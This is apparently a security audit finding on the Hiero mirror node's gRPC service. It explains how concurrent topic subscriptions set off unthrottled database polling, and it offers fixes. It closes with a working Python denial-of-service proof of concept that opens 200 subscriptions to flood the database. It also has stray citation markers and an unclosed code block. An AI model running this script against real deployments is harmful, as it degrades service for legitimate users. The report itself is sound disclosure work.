### Title
Unthrottled DB Query Storm via Concurrent gRPC Topic Subscriptions

### Summary
Every `subscribeTopic` call schedules a safety-check that fires after 1 second and, if no data has arrived, invokes `topicMessageRetriever.retrieve(gapFilter, false)` — the unthrottled path. In unthrottled mode, `PollingContext` issues up to `maxPolls` (default 12) DB queries at 20 ms intervals with a page size of 5 000 rows. Because there is no global per-IP subscription limit, an unprivileged attacker who opens many concurrent gRPC connections can trigger hundreds of simultaneous unthrottled retrieval bursts, causing a DB query storm that degrades service for all users.

### Finding Description

**Code path 1 — unthrottled PollingContext construction**

`grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java`, lines 94–107:

```java
private PollingContext(TopicMessageFilter filter, boolean throttled) {
    this.filter = filter;
    this.throttled = throttled;

    if (throttled) {
        numRepeats = Long.MAX_VALUE;
        frequency = retrieverProperties.getPollingFrequency();   // 2 s
        maxPageSize = retrieverProperties.getMaxPageSize();      // 1 000
    } else {
        RetrieverProperties.UnthrottledProperties unthrottled = retrieverProperties.getUnthrottled();
        numRepeats = unthrottled.getMaxPolls();                  // 12
        frequency = unthrottled.getPollingFrequency();           // 20 ms
        maxPageSize = unthrottled.getMaxPageSize();              // 5 000
    }
}

**Code path 2 — `isComplete()` never short-circuits the unthrottled path when no limit is set**

Lines 121–128: when `throttled=false`, `isComplete()` returns `true` only when `limitHit`. Without a client-supplied limit, it always returns `false`, so all 12 polls execute unconditionally. [2](#0-1) 

**Code path 3 — safety check triggers the unthrottled path for every subscription**

`grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java`, lines 67–70:

```java
Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
        .filter(_ -> !topicContext.isComplete())
        .flatMapMany(_ -> missingMessages(topicContext, null))
        .subscribeOn(Schedulers.boundedElastic());
```

`missingMessages(topicContext, null)` (line 149) calls `topicMessageRetriever.retrieve(gapFilter, false)` — the unthrottled path. This fires once per subscription, 1 second after subscription start, whenever no messages have been delivered. [3](#0-2) [4](#0-3) 

**Root cause / failed assumption**: The design assumes the unthrottled path is rare (gap recovery only). In practice, any subscription to a topic with no recent messages (e.g., a low-traffic or non-existent topic) will always trigger the safety check, and therefore always enter the unthrottled path. There is no global cap on concurrent subscriptions or per-IP rate limiting in the gRPC layer.

**Existing check that is insufficient**: `maxConcurrentCallsPerConnection = 5` (default) limits calls per single TCP connection, but an attacker can open an arbitrary number of connections. No IP-level connection cap or global subscription ceiling is enforced. [5](#0-4) 

### Impact Explanation

Each concurrent subscription to a quiet topic generates 12 DB queries at 20 ms intervals (5 000 rows/query max). With 200 concurrent subscriptions (40 connections × 5 calls each), the attacker drives ~2 400 DB queries in a 240 ms window (~10 000 queries/second). This saturates the DB connection pool and statement-execution capacity, causing query timeouts and latency spikes for all legitimate users. The `statementTimeout` of 10 000 ms means each query holds a DB connection for up to 10 seconds under load, amplifying pool exhaustion.

### Likelihood Explanation

No authentication is required to call `subscribeTopic`. The gRPC port (5600) is publicly exposed. Opening 40 TCP connections with 5 streams each is trivially achievable with any gRPC client library in a single script. The attack is repeatable: after the 12-poll burst completes (~240 ms), the attacker simply re-subscribes to restart the cycle. No economic cost is incurred.

### Recommendation

1. **Add a global concurrent-subscription cap** in `TopicMessageServiceImpl` (e.g., reject new subscriptions when `subscriberCount` exceeds a configurable threshold).
2. **Add per-IP connection/subscription rate limiting** at the Netty/gRPC interceptor layer.
3. **Raise the minimum `pollingFrequency` floor** for the unthrottled path (currently `@DurationMin(millis = 10)`) or require the unthrottled path to be gated behind an authenticated/privileged context.
4. **Make the safety check conditional** on whether the topic is known to have recent messages, avoiding the unthrottled retrieval for topics with no data.

### Proof of Concept

```python
import grpc
import threading
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2
from proto import timestamp_pb2, basic_types_pb2

TARGET = "mirror-node-grpc:5600"
TOPIC_ID = basic_types_pb2.TopicID(topicNum=9999999)  # non-existent / quiet topic
NUM_CONNECTIONS = 40
STREAMS_PER_CONNECTION = 5

def open_subscriptions(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=TOPIC_ID,
        consensusStartTime=timestamp_pb2.Timestamp(seconds=0),
        # no limit, no endTime → safety check always fires, isComplete() always false
    )
    streams = []
    for _ in range(STREAMS_PER_CONNECTION):
        s = stub.subscribeTopic(query)
        streams.append(s)
    # Hold streams open for 5 seconds to keep safety-check bursts overlapping
    import time; time.sleep(5)

threads = [threading.Thread(target=open_subscriptions, args=(i,)) for i in range(NUM_CONNECTIONS)]
for t in threads: t.start()
for t in threads: t.join()
# Result: 40×5 = 200 concurrent subscriptions each trigger 12 unthrottled DB queries
# at t≈1s → ~2400 queries in 240ms window against the database.
```
